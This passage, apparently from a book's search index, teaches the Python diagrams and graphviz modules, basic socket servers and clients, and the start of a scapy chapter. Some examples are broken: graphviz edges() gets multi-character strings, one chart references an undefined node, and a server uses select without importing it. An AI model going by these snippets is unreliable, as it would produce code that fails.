    "text": "15.8 Customizing Diagrams\nDiagrams can be customized by setting various attributes, such as the output format, the direction of the graph, and other styling options.\n\n15.8.1 Example\nfrom diagrams import Diagram, Cluster\nfrom diagrams.aws.compute import EC2\nfrom diagrams.aws.database import RDS\nfrom diagrams.aws.network import ELB\n\nwith Diagram(\"Custom Diagram\", show=False, direction=\"TB\"):\n    with Cluster(\"Web Cluster\"):\n        web1 = EC2(\"web1\")\n        web2 = EC2(\"web2\")\n        web3 = EC2(\"web3\")\n        \n    load_balancer = ELB(\"load balancer\")\n    database = RDS(\"database\")\n\n    load_balancer &gt;&gt; web1\n    load_balancer &gt;&gt; web2\n    load_balancer &gt;&gt; web3\n    web1 &gt;&gt; database\n    web2 &gt;&gt; database\n    web3 &gt;&gt; database\nIn this example, the direction of the graph is set to top-to-bottom (\"TB\").",
    "crumbs": [
      "<span class='chapter-number'>14</span>  <span class='chapter-title'>Introduction to Python Libraries for System Design</span>"
    ]
  },
  {
    "objectID": "13_python_lib_for_sys_design.html#supported-providers-and-services",
    "href": "13_python_lib_for_sys_design.html#supported-providers-and-services",
    "title": "14  Introduction to Python Libraries for System Design",
    "section": "15.9 Supported Providers and Services",
    "text": "15.9 Supported Providers and Services\nThe diagrams module supports various cloud providers and generic components. Each provider has its own set of services and components that can be used to create diagrams.\n\n15.9.1 AWS\nfrom diagrams.aws.compute import EC2\nfrom diagrams.aws.database import RDS\nfrom diagrams.aws.network import ELB\n\n\n15.9.2 Azure\nfrom diagrams.azure.compute import VM\nfrom diagrams.azure.database import SQLDatabase\nfrom diagrams.azure.network import LoadBalancer\n\n\n15.9.3 GCP\nfrom diagrams.gcp.compute import GCE\nfrom diagrams.gcp.database import SQL\nfrom diagrams.gcp.network import LoadBalancing\n\n\n15.9.4 Generic\nfrom diagrams.generic.compute import Server\nfrom diagrams.generic.database import SQL\nfrom diagrams.generic.network import Firewall\nFor a full list of supported providers and services, refer to the official documentation.",
    "crumbs": [
      "<span class='chapter-number'>14</span>  <span class='chapter-title'>Introduction to Python Libraries for System Design</span>"
    ]
  },
  {
    "objectID": "13_python_lib_for_sys_design.html#practical-examples",
    "href": "13_python_lib_for_sys_design.html#practical-examples",
    "title": "14  Introduction to Python Libraries for System Design",
    "section": "15.10 Practical Examples",
    "text": "15.10 Practical Examples\n\n15.10.1 Example 1: Multi-Cloud Architecture\nfrom diagrams import Diagram, Cluster\nfrom diagrams.aws.compute import EC2\nfrom diagrams.azure.compute import VM\nfrom diagrams.gcp.compute import GCE\nfrom diagrams.onprem.network import Internet\n\nwith Diagram(\"Multi-Cloud Architecture\", show=False):\n    internet = Internet(\"Internet\")\n    \n    with Cluster(\"AWS\"):\n        aws_web = EC2(\"web server\")\n        \n    with Cluster(\"Azure\"):\n        azure_web = VM(\"web server\")\n        \n    with Cluster(\"GCP\"):\n        gcp_web = GCE(\"web server\")\n        \n    internet &gt;&gt; aws_web\n    internet &gt;&gt; azure_web\n    internet &gt;&gt; gcp_web\n\n\n15.10.2 Example 2: Complex Microservices Architecture\nfrom diagrams import Diagram, Cluster\nfrom diagrams.aws.compute import EC2\nfrom diagrams.aws.database import RDS\nfrom diagrams.aws.network import ELB\nfrom diagrams.onprem.client import User\n\nwith Diagram(\"Microservices Architecture\", show=False):\n    user = User(\"User\")\n    \n    with Cluster(\"Load Balancer\"):\n        lb = ELB(\"Load Balancer\")\n        \n    with Cluster(\"Services\"):\n        svc1 = EC2(\"Service 1\")\n        svc2 = EC2(\"Service 2\")\n        svc3 = EC2(\"Service 3\")\n    \n    db = RDS(\"Database\")\n    \n    user &gt;&gt; lb\n    lb &gt;&gt; svc1\n    lb &gt;&gt; svc2\n    lb &gt;&gt; svc3\n    svc1 &gt;&gt; db\n    svc2 &gt;&gt; db\n    svc3 &gt;&gt; db",
    "crumbs": [
      "<span class='chapter-number'>14</span>  <span class='chapter-title'>Introduction to Python Libraries for System Design</span>"
    ]
  },
  {
    "objectID": "13_python_lib_for_sys_design.html#best-practices",
    "href": "13_python_lib_for_sys_design.html#best-practices",
    "title": "14  Introduction to Python Libraries for System Design",
    "section": "15.11 Best Practices",
    "text": "15.11 Best Practices\n\nOrganize Components: Use clusters to logically group related components.\nUse Descriptive Names: Label your nodes and clusters with meaningful names.\nOptimize Layout: Adjust the diagram direction and other settings to make the diagram clear and easy to understand.\nDocument Your Diagram: Provide context and explanations for your diagram to help others understand it.",
    "crumbs": [
      "<span class='chapter-number'>14</span>  <span class='chapter-title'>Introduction to Python Libraries for System Design</span>"
    ]
  },
  {
    "objectID": "13_python_lib_for_sys_design.html#conclusion-1",
    "href": "13_python_lib_for_sys_design.html#conclusion-1",
    "title": "14  Introduction to Python Libraries for System Design",
    "section": "15.12 Conclusion",
    "text": "15.12 Conclusion\nThe diagrams module in Python is a powerful tool for creating detailed and professional-looking diagrams for cloud architecture, network layouts, and other system configurations. With its simple and intuitive syntax, you can quickly create and customize diagrams to suit your needs. By leveraging the full range of features provided by diagrams, you can improve the clarity and effectiveness of your documentation and presentations.",
    "crumbs": [
      "<span class='chapter-number'>14</span>  <span class='chapter-title'>Introduction to Python Libraries for System Design</span>"
    ]
  },
  {
    "objectID": "13_python_lib_for_sys_design.html#table-of-contents-1",
    "href": "13_python_lib_for_sys_design.html#table-of-contents-1",
    "title": "14  Introduction to Python Libraries for System Design",
    "section": "16.1 Table of Contents",
    "text": "16.1 Table of Contents\n\nIntroduction to Graphviz\nInstallation\nBasic Usage\nCreating Graphs\nCustomizing Graphs\nWorking with Subgraphs\nAdvanced Features\nPractical Examples\nExporting and Rendering\nBest Practices\nConclusion",
    "crumbs": [
      "<span class='chapter-number'>14</span>  <span class='chapter-title'>Introduction to Python Libraries for System Design</span>"
    ]
  },
  {
    "objectID": "13_python_lib_for_sys_design.html#introduction-to-graphviz",
    "href": "13_python_lib_for_sys_design.html#introduction-to-graphviz",
    "title": "14  Introduction to Python Libraries for System Design",
    "section": "16.2 Introduction to Graphviz",
    "text": "16.2 Introduction to Graphviz\nGraphviz is a graph visualization software that provides a way to represent structural information as diagrams of abstract graphs and networks. The graphviz Python module provides a way to interface with the Graphviz software, allowing you to create and manipulate graphs directly from Python code.",
    "crumbs": [
      "<span class='chapter-number'>14</span>  <span class='chapter-title'>Introduction to Python Libraries for System Design</span>"
    ]
  },
  {
    "objectID": "13_python_lib_for_sys_design.html#installation-1",
    "href": "13_python_lib_for_sys_design.html#installation-1",
    "title": "14  Introduction to Python Libraries for System Design",
    "section": "16.3 Installation",
    "text": "16.3 Installation\nTo install the graphviz module, you need to have Python installed on your system. You can then install it using pip:\npip install graphviz\nAdditionally, you need to have the Graphviz software installed. Depending on your operating system, you can install it using the following commands:\n\nFor Ubuntu/Debian:\nsudo apt-get install graphviz\nFor macOS:\nbrew install graphviz\nFor Windows:\nDownload and install Graphviz from here.",
    "crumbs": [
      "<span class='chapter-number'>14</span>  <span class='chapter-title'>Introduction to Python Libraries for System Design</span>"
    ]
  },
  {
    "objectID": "13_python_lib_for_sys_design.html#basic-usage-1",
    "href": "13_python_lib_for_sys_design.html#basic-usage-1",
    "title": "14  Introduction to Python Libraries for System Design",
    "section": "16.4 Basic Usage",
    "text": "16.4 Basic Usage\nTo create a basic graph using the graphviz module, you need to import the Graph or Digraph class from the graphviz module. A Graph is an undirected graph, while a Digraph is a directed graph.\n\n16.4.1 Example\nfrom graphviz import Digraph\n\ndot = Digraph(comment='My First Graph')\ndot.node('A', 'Node A')\ndot.node('B', 'Node B')\ndot.edge('A', 'B', label='Edge from A to B')\nprint(dot.source)\n\ndot.render('output/first_graph', format='png', view=True)\nThis code snippet creates a simple directed graph with two nodes and an edge between them. The render method saves the graph to a file and optionally opens it for viewing.",
    "crumbs": [
      "<span class='chapter-number'>14</span>  <span class='chapter-title'>Introduction to Python Libraries for System Design</span>"
    ]
  },
  {
    "objectID": "13_python_lib_for_sys_design.html#creating-graphs",
    "href": "13_python_lib_for_sys_design.html#creating-graphs",
    "title": "14  Introduction to Python Libraries for System Design",
    "section": "16.5 Creating Graphs",
    "text": "16.5 Creating Graphs\n\n16.5.1 Nodes\nNodes represent the vertices of the graph. You can add nodes to the graph using the node method.\n\n\n16.5.2 Example\ndot.node('A', 'Node A')\ndot.node('B', 'Node B')\n\n\n16.5.3 Edges\nEdges represent the connections between nodes. You can add edges to the graph using the edge method.\n\n\n16.5.4 Example\ndot.edge('A', 'B', label='Edge from A to B')\n\n\n16.5.5 Adding Multiple Edges\nYou can add multiple edges at once using the edges method.\n\n\n16.5.6 Example\ndot.edges(['AC', 'BD', 'CD'])",
    "crumbs": [
      "<span class='chapter-number'>14</span>  <span class='chapter-title'>Introduction to Python Libraries for System Design</span>"
    ]
  },
  {
    "objectID": "13_python_lib_for_sys_design.html#customizing-graphs-1",
    "href": "13_python_lib_for_sys_design.html#customizing-graphs-1",
    "title": "14  Introduction to Python Libraries for System Design",
    "section": "16.6 Customizing Graphs",
    "text": "16.6 Customizing Graphs\n\n16.6.1 Node Attributes\nYou can customize the appearance of nodes using various attributes such as color, shape, and style.\n\n\n16.6.2 Example\ndot.node('A', 'Node A', color='lightblue', style='filled', shape='box')\n\n\n16.6.3 Edge Attributes\nYou can customize the appearance of edges using attributes such as color, style, and label.\n\n\n16.6.4 Example\ndot.edge('A', 'B', label='Edge from A to B', color='red', style='dashed')\n\n\n16.6.5 Graph Attributes\nYou can set global attributes for the graph, nodes, and edges using the attr method.\n\n\n16.6.6 Example\ndot.attr(rankdir='LR', size='8,5')\ndot.node_attr.update(style='filled', color='lightgrey')\ndot.edge_attr.update(arrowsize='2', color='blue')",
    "crumbs": [
      "<span class='chapter-number'>14</span>  <span class='chapter-title'>Introduction to Python Libraries for System Design</span>"
    ]
  },
  {
    "objectID": "13_python_lib_for_sys_design.html#working-with-subgraphs",
    "href": "13_python_lib_for_sys_design.html#working-with-subgraphs",
    "title": "14  Introduction to Python Libraries for System Design",
    "section": "16.7 Working with Subgraphs",
    "text": "16.7 Working with Subgraphs\nSubgraphs allow you to group nodes and edges into clusters or logical groups.\n\n16.7.1 Example\nwith dot.subgraph(name='cluster_0') as c:\n    c.attr(style='filled', color='lightgrey')\n    c.node_attr.update(style='filled', color='white')\n    c.node('A')\n    c.node('B')\n    c.edge('A', 'B', label='Edge in Cluster')\n    c.attr(label='Cluster 0')\n\ndot.node('C', 'Node C')\ndot.edge('B', 'C', label='Edge to C')",
    "crumbs": [
      "<span class='chapter-number'>14</span>  <span class='chapter-title'>Introduction to Python Libraries for System Design</span>"
    ]
  },
  {
    "objectID": "13_python_lib_for_sys_design.html#advanced-features",
    "href": "13_python_lib_for_sys_design.html#advanced-features",
    "title": "14  Introduction to Python Libraries for System Design",
    "section": "16.8 Advanced Features",
    "text": "16.8 Advanced Features\n\n16.8.1 Record-Based Nodes\nRecord-based nodes allow you to create nodes with multiple fields, which is useful for representing structured data.\n\n\n16.8.2 Example\ndot.node('struct1', label='&lt;f0&gt; left|&lt;f1&gt; mid\\ dle|&lt;f2&gt; right', shape='record')\ndot.node('struct2', label='one|two', shape='record')\ndot.edge('struct1:f1', 'struct2', label='Field Link')\n\n\n16.8.3 HTML-Like Labels\nYou can use HTML-like labels to create more complex node labels.\n\n\n16.8.4 Example\ndot.node('html_node', label='&lt;&lt;TABLE BORDER=\"0\" CELLBORDER=\"1\" CELLSPACING=\"0\"&gt;&lt;TR&gt;&lt;TD&gt;Cell 1&lt;/TD&gt;&lt;TD&gt;Cell 2&lt;/TD&gt;&lt;/TR&gt;&lt;/TABLE&gt;&gt;')\n\n\n16.8.5 Changing Ranks\nYou can change the rank of nodes to control their layout in the graph.\n\n\n16.8.6 Example\ndot.attr(rankdir='LR')\ndot.node('A')\ndot.node('B')\ndot.edge('A', 'B')\n\nwith dot.subgraph() as s:\n    s.attr(rank='same')\n    s.node('C')\n    s.node('D')\n\ndot.edge('B', 'C')\ndot.edge('C', 'D')",
    "crumbs": [
      "<span class='chapter-number'>14</span>  <span class='chapter-title'>Introduction to Python Libraries for System Design</span>"
    ]
  },
  {
    "objectID": "13_python_lib_for_sys_design.html#practical-examples-1",
    "href": "13_python_lib_for_sys_design.html#practical-examples-1",
    "title": "14  Introduction to Python Libraries for System Design",
    "section": "16.9 Practical Examples",
    "text": "16.9 Practical Examples\n\n16.9.1 Example 1: Organizational Chart\nfrom graphviz import Digraph\n\norg_chart = Digraph(comment='Organizational Chart')\n\norg_chart.node('CEO')\norg_chart.node('CTO')\norg_chart.node('CFO')\norg_chart.node('COO')\norg_chart.node('Dev1')\norg_chart.node('Dev2')\norg_chart.node('Account1')\norg_chart.node('Account2')\n\norg_chart.edges(['CEOCTO', 'CEOCFO', 'CEOCMO', 'CTODev1', 'CTODev2', 'CFOAccount1', 'CFOAccount2'])\n\norg_chart.render('output/org_chart', format='png', view=True)\n\n\n16.9.2 Example 2: Network Topology\nfrom graphviz import Digraph\n\nnet_topo = Digraph(comment='Network Topology')\n\nnet_topo.node('Router', shape='box')\nnet_topo.node('Switch', shape='box')\nnet_topo.node('Server1', shape='oval')\nnet_topo.node('Server2', shape='oval')\nnet_topo.node('PC1', shape='oval')\nnet_topo.node('PC2', shape='oval')\n\nnet_topo.edges(['RouterSwitch', 'SwitchServer1', 'SwitchServer2', 'SwitchPC1', 'SwitchPC2'])\n\nnet_topo.render('output/net_topo', format='png', view=True)",
    "crumbs": [
      "<span class='chapter-number'>14</span>  <span class='chapter-title'>Introduction to Python Libraries for System Design</span>"
    ]
  },
  {
    "objectID": "13_python_lib_for_sys_design.html#exporting-and-rendering",
    "href": "13_python_lib_for_sys_design.html#exporting-and-rendering",
    "title": "14  Introduction to Python Libraries for System Design",
    "section": "16.10 Exporting and Rendering",
    "text": "16.10 Exporting and Rendering\nYou can export and render your graph to various formats, including PNG, PDF, and SVG.\n\n16.10.1 Example\ndot.render('output/my_graph', format='png', view=True)\nThis command saves the graph as a PNG file and opens it for viewing.",
    "crumbs": [
      "<span class='chapter-number'>14</span>  <span class='chapter-title'>Introduction to Python Libraries for System Design</span>"
    ]
  },
  {
    "objectID": "13_python_lib_for_sys_design.html#best-practices-1",
    "href": "13_python_lib_for_sys_design.html#best-practices-1",
    "title": "14  Introduction to Python Libraries for System Design",
    "section": "16.11 Best Practices",
    "text": "16.11 Best Practices\n\nUse Meaningful Labels: Label your nodes and edges with meaningful names to make the graph easier to understand.\nOrganize with Subgraphs: Use subgraphs to logically group related nodes and edges.\nCustomize for Clarity: Customize the appearance of nodes and edges to improve readability.\nKeep it Simple: Avoid overly complex graphs that are hard to read and understand.\nDocument Your Graph: Provide context and explanations for your graph to help others understand it.",
    "crumbs": [
      "<span class='chapter-number'>14</span>  <span class='chapter-title'>Introduction to Python Libraries for System Design</span>"
    ]
  },
  {
    "objectID": "13_python_lib_for_sys_design.html#conclusion-2",
    "href": "13_python_lib_for_sys_design.html#conclusion-2",
    "title": "14  Introduction to Python Libraries for System Design",
    "section": "16.12 Conclusion",
    "text": "16.12 Conclusion\nThe graphviz Python module is a powerful tool for creating and visualizing graphs. It provides a simple and intuitive interface for creating complex diagrams and supports various customization options to improve the clarity and readability of your graphs. By leveraging the full range of features provided by graphviz, you can create detailed and professional-looking diagrams for a wide range of applications.",
    "crumbs": [
      "<span class='chapter-number'>14</span>  <span class='chapter-title'>Introduction to Python Libraries for System Design</span>"
    ]
  },
  {
    "objectID": "14_foundations_of_data_comm.html",
    "href": "14_foundations_of_data_comm.html",
    "title": "15  Foundations of Data Communication with Python",
    "section": "",
    "text": "15.0.1 Overview of Data Communication\nData communication involves the exchange of data between devices through a transmission medium. Key components include:",
    "crumbs": [
      "<span class='chapter-number'>15</span>  <span class='chapter-title'>Foundations of Data Communication with Python</span>"
    ]
  },
  {
    "objectID": "14_foundations_of_data_comm.html#table-of-contents",
    "href": "14_foundations_of_data_comm.html#table-of-contents",
    "title": "15  Foundations of Data Communication with Python",
    "section": "16.1 Table of Contents",
    "text": "16.1 Table of Contents\n\nIntroduction to Sockets and Data Communication\nInstalling Python and the socket Module\nBasic Concepts\nCreating a Simple Server\nCreating a Simple Client\nCommunication Between Server and Client\nNon-Blocking Sockets\nHandling Multiple Connections\nPractical Examples\nBest Practices\nConclusion",
    "crumbs": [
      "<span class='chapter-number'>15</span>  <span class='chapter-title'>Foundations of Data Communication with Python</span>"
    ]
  },
  {
    "objectID": "14_foundations_of_data_comm.html#introduction-to-sockets-and-data-communication",
    "href": "14_foundations_of_data_comm.html#introduction-to-sockets-and-data-communication",
    "title": "15  Foundations of Data Communication with Python",
    "section": "16.2 Introduction to Sockets and Data Communication",
    "text": "16.2 Introduction to Sockets and Data Communication\nSockets are the foundation of modern network communication. They allow applications to communicate with each other over a network. A socket is one endpoint of a two-way communication link between two programs running on the network. Sockets can be used to implement various communication protocols, including TCP and UDP.\n\nTCP (Transmission Control Protocol): A connection-oriented protocol that ensures reliable and ordered delivery of data.\nUDP (User Datagram Protocol): A connectionless protocol that provides faster but less reliable data transmission.",
    "crumbs": [
      "<span class='chapter-number'>15</span>  <span class='chapter-title'>Foundations of Data Communication with Python</span>"
    ]
  },
  {
    "objectID": "14_foundations_of_data_comm.html#installing-python-and-the-socket-module",
    "href": "14_foundations_of_data_comm.html#installing-python-and-the-socket-module",
    "title": "15  Foundations of Data Communication with Python",
    "section": "16.3 Installing Python and the socket Module",
    "text": "16.3 Installing Python and the socket Module\nThe socket module is part of Python’s standard library, so you don’t need to install anything extra to use it. Make sure you have Python installed on your system. You can download Python from python.org.",
    "crumbs": [
      "<span class='chapter-number'>15</span>  <span class='chapter-title'>Foundations of Data Communication with Python</span>"
    ]
  },
  {
    "objectID": "14_foundations_of_data_comm.html#basic-concepts",
    "href": "14_foundations_of_data_comm.html#basic-concepts",
    "title": "15  Foundations of Data Communication with Python",
    "section": "16.4 Basic Concepts",
    "text": "16.4 Basic Concepts\n\n16.4.1 Importing the socket Module\nTo use the socket module, you need to import it:\nimport socket\n\n\n16.4.2 Creating a Socket\nA socket can be created using the socket.socket() function. This function requires two arguments:\n\nAddress Family: The family of protocols (e.g., socket.AF_INET for IPv4).\nSocket Type: The type of socket (e.g., socket.SOCK_STREAM for TCP, socket.SOCK_DGRAM for UDP).\n\n\n\n16.4.3 Example\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n\n\n16.4.4 Binding to an Address\nFor a server, you need to bind the socket to an address and port number using the bind() method.\n\n\n16.4.5 Example\ns.bind(('localhost', 12345))\n\n\n16.4.6 Listening for Connections\nAfter binding, a server socket needs to listen for incoming connections using the listen() method.\n\n\n16.4.7 Example\ns.listen(5)\n\n\n16.4.8 Accepting Connections\nTo accept a connection, use the accept() method, which returns a new socket object and the address of the client.\n\n\n16.4.9 Example\nconn, addr = s.accept()\n\n\n16.4.10 Sending and Receiving Data\n\nsend(): Sends data to the connected socket.\nrecv(): Receives data from the connected socket.\n\n\n\n16.4.11 Example\nconn.send(b'Hello, World!')\ndata = conn.recv(1024)\nprint(data)",
    "crumbs": [
      "<span class='chapter-number'>15</span>  <span class='chapter-title'>Foundations of Data Communication with Python</span>"
    ]
  },
  {
    "objectID": "14_foundations_of_data_comm.html#creating-a-simple-server",
    "href": "14_foundations_of_data_comm.html#creating-a-simple-server",
    "title": "15  Foundations of Data Communication with Python",
    "section": "16.5 Creating a Simple Server",
    "text": "16.5 Creating a Simple Server\nHere is a complete example of a simple server that listens on a specified port and sends a message to any client that connects:\nimport socket\n\ndef simple_server():\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    s.bind(('localhost', 12345))\n    s.listen(5)\n    print(\"Server is listening on port 12345...\")\n    \n    while True:\n        conn, addr = s.accept()\n        print(f\"Connected by {addr}\")\n        conn.send(b'Hello, World!')\n        conn.close()\n\nif __name__ == \"__main__\":\n    simple_server()",
    "crumbs": [
      "<span class='chapter-number'>15</span>  <span class='chapter-title'>Foundations of Data Communication with Python</span>"
    ]
  },
  {
    "objectID": "14_foundations_of_data_comm.html#creating-a-simple-client",
    "href": "14_foundations_of_data_comm.html#creating-a-simple-client",
    "title": "15  Foundations of Data Communication with Python",
    "section": "16.6 Creating a Simple Client",
    "text": "16.6 Creating a Simple Client\nHere is a simple client that connects to the server and receives a message:\nimport socket\n\ndef simple_client():\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    s.connect(('localhost', 12345))\n    data = s.recv(1024)\n    print(f\"Received: {data.decode()}\")\n    s.close()\n\nif __name__ == \"__main__\":\n    simple_client()",
    "crumbs": [
      "<span class='chapter-number'>15</span>  <span class='chapter-title'>Foundations of Data Communication with Python</span>"
    ]
  },
  {
    "objectID": "14_foundations_of_data_comm.html#communication-between-server-and-client",
    "href": "14_foundations_of_data_comm.html#communication-between-server-and-client",
    "title": "15  Foundations of Data Communication with Python",
    "section": "16.7 Communication Between Server and Client",
    "text": "16.7 Communication Between Server and Client\nIn a real-world application, communication between the server and client involves a loop where both parties can send and receive messages. Here is an example that demonstrates this:\n\n16.7.1 Server\nimport socket\n\ndef chat_server():\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    s.bind(('localhost', 12345))\n    s.listen(5)\n    print(\"Chat server is listening on port 12345...\")\n    \n    conn, addr = s.accept()\n    print(f\"Connected by {addr}\")\n    \n    while True:\n        data = conn.recv(1024)\n        if not data:\n            break\n        print(f\"Client: {data.decode()}\")\n        response = input(\"You: \")\n        conn.send(response.encode())\n    \n    conn.close()\n\nif __name__ == \"__main__\":\n    chat_server()\n\n\n16.7.2 Client\nimport socket\n\ndef chat_client():\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    s.connect(('localhost', 12345))\n    \n    while True:\n        message = input(\"You: \")\n        s.send(message.encode())\n        data = s.recv(1024)\n        print(f\"Server: {data.decode()}\")\n    \n    s.close()\n\nif __name__ == \"__main__\":\n    chat_client()",
    "crumbs": [
      "<span class='chapter-number'>15</span>  <span class='chapter-title'>Foundations of Data Communication with Python</span>"
    ]
  },
  {
    "objectID": "14_foundations_of_data_comm.html#non-blocking-sockets",
    "href": "14_foundations_of_data_comm.html#non-blocking-sockets",
    "title": "15  Foundations of Data Communication with Python",
    "section": "16.8 Non-Blocking Sockets",
    "text": "16.8 Non-Blocking Sockets\nNon-blocking sockets allow your application to continue running while it waits for network events. This can be useful for handling multiple connections simultaneously without using multiple threads or processes.\n\n16.8.1 Example\nimport socket\n\ndef non_blocking_server():\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    s.setblocking(0)\n    s.bind(('localhost', 12345))\n    s.listen(5)\n    \n    inputs = [s]\n    outputs = []\n    \n    while inputs:\n        readable, writable, exceptional = select.select(inputs, outputs, inputs)\n        \n        for sock in readable:\n            if sock is s:\n                conn, addr = s.accept()\n                conn.setblocking(0)\n                inputs.append(conn)\n            else:\n                data = sock.recv(1024)\n                if data:\n                    sock.send(data)\n                else:\n                    inputs.remove(sock)\n                    sock.close()\n\nif __name__ == \"__main__\":\n    non_blocking_server()",
    "crumbs": [
      "<span class='chapter-number'>15</span>  <span class='chapter-title'>Foundations of Data Communication with Python</span>"
    ]
  },
  {
    "objectID": "14_foundations_of_data_comm.html#handling-multiple-connections",
    "href": "14_foundations_of_data_comm.html#handling-multiple-connections",
    "title": "15  Foundations of Data Communication with Python",
    "section": "16.9 Handling Multiple Connections",
    "text": "16.9 Handling Multiple Connections\nTo handle multiple connections efficiently, you can use the select module, which allows you to monitor multiple sockets for readability, writability, and exceptional conditions.\n\n16.9.1 Example\nimport socket\nimport select\n\ndef multi_client_server():\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    s.bind(('localhost', 12345))\n    s.listen(5)\n    \n    inputs = [s]\n    outputs = []\n    \n    while inputs:\n        readable, writable, exceptional = select.select(inputs, outputs, inputs)\n        \n        for sock in readable:\n            if sock is s:\n                conn, addr = s.accept()\n                print(f\"Connected by {addr}\")\n                inputs.append(conn)\n            else:\n                data = sock.recv(1024)\n                if data:\n                    sock.send(data)\n                else:\n                    inputs.remove(sock)\n                    sock.close()\n\nif __name__ == \"__main__\":\n    multi_client_server()",
    "crumbs": [
      "<span class='chapter-number'>15</span>  <span class='chapter-title'>Foundations of Data Communication with Python</span>"
    ]
  },
  {
    "objectID": "14_foundations_of_data_comm.html#practical-examples",
    "href": "14_foundations_of_data_comm.html#practical-examples",
    "title": "15  Foundations of Data Communication with Python",
    "section": "16.10 Practical Examples",
    "text": "16.10 Practical Examples\n\n16.10.1 Example 1: Simple HTTP Server\nThis example demonstrates how to create a simple HTTP server that responds to GET requests.\nimport socket\n\ndef http_server():\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    s.bind(('localhost', 8080))\n    s.listen(5)\n    print(\"HTTP server is listening on port 8080...\")\n    \n    while True:\n        conn, addr = s.accept()\n        request = conn.recv(1024).decode()\n        print(f\"Request from {addr}: {request}\")\n        \n        response = 'HTTP/1.0 200 OK\\n\\nHello, World!'\n        conn.send(response.encode())\n        conn.close()\n\nif __name__ == \"__main__\":\n    http_server()\n\n\n16.10.2 Example 2: Echo Server with Timeout\nThis example demonstrates how to create an echo server with a timeout feature.\nimport socket\n\ndef echo_server_with_timeout():\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    s.bind(('localhost', 12345))\n    s.listen(5)\n    s.settimeout(10)\n    print(\"Echo server is listening on port 12345...\")\n    \n    try:\n        while True:\n            conn, addr = s.accept()\n            print(f\"Connected by {addr}\")\n            while True:\n                data = conn.recv(1024)\n                if not data:\n                    break\n                conn.send(data)\n            conn.close()\n    except socket.timeout:\n        print(\"Connection timed out\")\n    finally:\n        s.close()\n\nif __name__ == \"__main__\":\n    echo_server_with_timeout()",
    "crumbs": [
      "<span class='chapter-number'>15</span>  <span class='chapter-title'>Foundations of Data Communication with Python</span>"
    ]
  },
  {
    "objectID": "14_foundations_of_data_comm.html#best-practices",
    "href": "14_foundations_of_data_comm.html#best-practices",
    "title": "15  Foundations of Data Communication with Python",
    "section": "16.11 Best Practices",
    "text": "16.11 Best Practices\n\nError Handling: Always include error handling in your socket applications to manage unexpected conditions gracefully.\nResource Management: Ensure sockets are properly closed to free up resources.\nSecurity: Be mindful of security\n\nconcerns, such as data encryption and validation, especially when dealing with public networks. 4. Concurrency: Use non-blocking sockets or threading/multiprocessing to handle multiple connections efficiently. 5. Documentation: Document your code to make it easier to understand and maintain.",
    "crumbs": [
      "<span class='chapter-number'>15</span>  <span class='chapter-title'>Foundations of Data Communication with Python</span>"
    ]
  },
  {
    "objectID": "14_foundations_of_data_comm.html#conclusion-1",
    "href": "14_foundations_of_data_comm.html#conclusion-1",
    "title": "15  Foundations of Data Communication with Python",
    "section": "16.12 Conclusion",
    "text": "16.12 Conclusion\nThe socket module is a powerful tool for creating networked applications in Python. By understanding the basics and advanced features of this module, you can implement robust data communication solutions. Whether you are building a simple chat application or a complex server, the socket module provides the necessary functionality to handle network communication effectively.",
    "crumbs": [
      "<span class='chapter-number'>15</span>  <span class='chapter-title'>Foundations of Data Communication with Python</span>"
    ]
  },
  {
    "objectID": "15_network_architecture_protocols.html",
    "href": "15_network_architecture_protocols.html",
    "title": "16  Network Architecture and Protocols with Python",
    "section": "",
    "text": "16.0.1 Network Layer Topics",
    "crumbs": [
      "<span class='chapter-number'>16</span>  <span class='chapter-title'>Network Architecture and Protocols with Python</span>"
    ]
  },
  {
    "objectID": "15_network_architecture_protocols.html#table-of-contents",
    "href": "15_network_architecture_protocols.html#table-of-contents",
    "title": "16  Network Architecture and Protocols with Python",
    "section": "17.1 Table of Contents",
    "text": "17.1 Table of Contents\n\nIntroduction to scapy\nInstalling scapy\nBasic Concepts\nCreating and Sending Packets\nCapturing Packets\nAnalyzing Packets\nAdvanced Usage\nPractical Examples\nBest Practices\nConclusion",
    "crumbs": [
      "<span class='chapter-number'>16</span>  <span class='chapter-title'>Network Architecture and Protocols with Python</span>"
    ]
  },
  {
    "objectID": "15_network_architecture_protocols.html#introduction-to-scapy",
    "href": "15_network_architecture_protocols.html#introduction-to-scapy",
    "title": "16  Network Architecture and Protocols with Python",
    "section": "17.2 Introduction to scapy",
    "text": "17.2 Introduction to scapy\nscapy is a Python-based interactive network packet manipulation tool. It allows you to create, send, receive, and manipulate network packets. It supports many network protocols and can be used for tasks such as network discovery, scanning, tracerouting, probing, and penetration testing.",
    "crumbs": [
      "<span class='chapter-number'>16</span>  <span class='chapter-title'>Network Architecture and Protocols with Python</span>"
    ]
  },
  {
    "objectID": "15_network_architecture_protocols.html#installing-scapy-1",
    "href": "15_network_architecture_protocols.html#installing-scapy-1",
    "title": "16  Network Architecture and Protocols with Python",
    "section": "17.3 Installing scapy",
    "text": "17.3 Installing scapy\nTo install scapy, you can use pip:\npip install scapy\nYou may also need to install additional system dependencies, such as libpcap and tcpdump, depending on your operating system.",
    "crumbs": [
      "<span class='chapter-number'>16</span>  <span class='chapter-title'>Network Architecture and Protocols with Python</span>"
    ]
  },
  {
    "objectID": "15_network_architecture_protocols.html#basic-concepts",
    "href": "15_network_architecture_protocols.html#basic-concepts",
    "title": "16  Network Architecture and Protocols with Python",
    "section": "17.4 Basic Concepts",
    "text": "17.4 Basic Concepts\n\n17.4.1 Importing scapy\nTo use scapy, you need to import it:\nfrom scapy.all import *\n\n\n17.4.2 Layers and Packets\nscapy uses a layered approach to construct and dissect packets. Each layer represents a network protocol (e.g., Ethernet, IP, TCP). Packets are created by stacking these layers.\n\n\n17.4.3 Example\nether = Ether()\nip = IP()\ntcp = TCP()\npacket = ether / ip / tcp",
    "crumbs": [
      "<span class='chapter-number'>16</span>  <span class='chapter-title'>Network Architecture and Protocols with Python</span>"
    ]
  },
  {
    "objectID": "15_network_architecture_protocols.html#creating-and-sending-packets",
